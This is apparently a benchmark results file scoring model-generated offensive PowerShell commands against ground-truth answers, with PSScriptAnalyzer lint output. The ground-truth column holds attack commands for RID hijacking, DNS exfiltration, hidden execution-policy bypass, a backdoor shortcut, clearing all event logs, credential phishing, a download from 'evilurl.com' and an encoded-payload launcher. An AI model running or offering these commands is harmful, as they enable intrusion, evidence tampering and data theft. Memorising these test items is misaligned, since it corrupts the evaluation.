Answer,Answer,Ground Truth,ANSWER Rulename,ANSWER Message,ANSWER Severity,TRUTH Rulename,TRUTH Message,TRUTH Severity
"Invoke-WmiMethod -Class Win32_UserAccount -Name Rename -ArgumentList ""guest"", ""newguest""","Invoke-WmiMethod -Class Win32_UserAccount -Name Rename -ArgumentList ""guest"", ""newguest""",Invoke-RIDHijacking -UseGuest -RID 1001 -Password Password1,['PSAvoidUsingWMICmdlet '],"[""File 'buffer.ps1' uses WMI cmdlet. For PowerShell 3.0 and above, use CIM cmdlet which perform the same tasks as the WMI cmdlets. The CIM cmdlets comply with WS-Management (WSMan) standards and with the Common Information Model (CIM) standard, which enables the cmdlets to use the same techniques to manage Windows computers and those running other operating systems. ""]",['Warning'],[''],[''],['']
Import-Module YourModuleName; Invoke-ExfiltrationFunction,Import-Module YourModuleName; Invoke-ExfiltrationFunction,Import-Module ${ps_module} ; Invoke-DNSExfiltrator -i ${ps_module} -d ${domain} -p ${password} -doh ${doh} -t ${time} ${encoding},[''],[''],[''],[''],[''],['']
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Path\To\Your\Script.ps1,powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Path\To\Your\Script.ps1,powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File malicious.ps1,[''],[''],[''],[''],[''],['']
"hh.exe -storagehandler ""YourStorageHandler"" -file ""YourHHFilePath"" -chm ""YourCHMFilePath""","hh.exe -storagehandler ""YourStorageHandler"" -file ""YourHHFilePath"" -chm ""YourCHMFilePath""",Invoke-ATHCompiledHelp -InfoTechStorageHandler ${infotech_storage_handler} -HHFilePath ${hh_file_path} -CHMFilePath ${chm_file_path},[''],[''],[''],[''],[''],['']
"Invoke-Item -Path ""C:\Path\To\Your\Shortcut.lnk""; Remove-Item -Path ""C:\Path\To\Your\Backdoor.exe""","Invoke-Item -Path ""C:\Path\To\Your\Shortcut.lnk""; Remove-Item -Path ""C:\Path\To\Your\Backdoor.exe""",Invoke-BackdoorLNK -LNKPath C:\Users\john\Desktop\Firefox.lnk -CleanUp,[''],[''],[''],[''],[''],['']
"Clear-EventLog -LogName ""Security"" -ComputerName ""localhost""","Clear-EventLog -LogName ""Security"" -ComputerName ""localhost""",$logs = Get-EventLog -List | ForEach-Object {$.Log} ; $logs | ForEach-Object {Clear-EventLog -LogName $ } ; Get-EventLog -list,[''],[''],[''],[''],[''],['']
"psexec.exe -s -i -d ""YourCommand"" -t -l -h","psexec.exe -s -i -d ""YourCommand"" -t -l -h","cmd /c ""${ps_exec_location}"" -accepteula -i -s cmd.exe /c logman update trace ""${session}"" --p ""${provider}"" -ets",[''],[''],[''],[''],[''],['']
Invoke-PhishingAttack -Type Credential,Invoke-PhishingAttack -Type Credential,Invoke-CredentialPhisher,[''],[''],[''],[''],[''],['']
"Invoke-WebRequest -Uri ""YourFileURL"" -OutFile ""$env:TEMP\YourFileName""","Invoke-WebRequest -Uri ""YourFileURL"" -OutFile ""$env:TEMP\YourFileName""","$x=""$env:temp\jxm.exe"";(New-Object System.Net.WebClient).DownloadFile('http://evilurl.com/')",[''],[''],[''],['PSUseDeclaredVarsMoreThanAssignments '],"[""The variable 'x' is assigned but never used. ""]",['Warning']
"powershell.exe -EncodedCommand ""YourBase64EncodedPayload""","powershell.exe -EncodedCommand ""YourBase64EncodedPayload""","$payload = [System.Text.Encoding]::UTF8.GetBytes(""<malicious payload>""); $process = New-Object System.Diagnostics.Process; $process.StartInfo.FileName = ""powershell.exe""; $process.StartInfo.Arguments = ""-ExecutionPolicy Bypass -NoProfile -EncodedCommand "" + [Convert]::ToBase64String($payload); $process.Start()",[''],[''],[''],[''],[''],['']
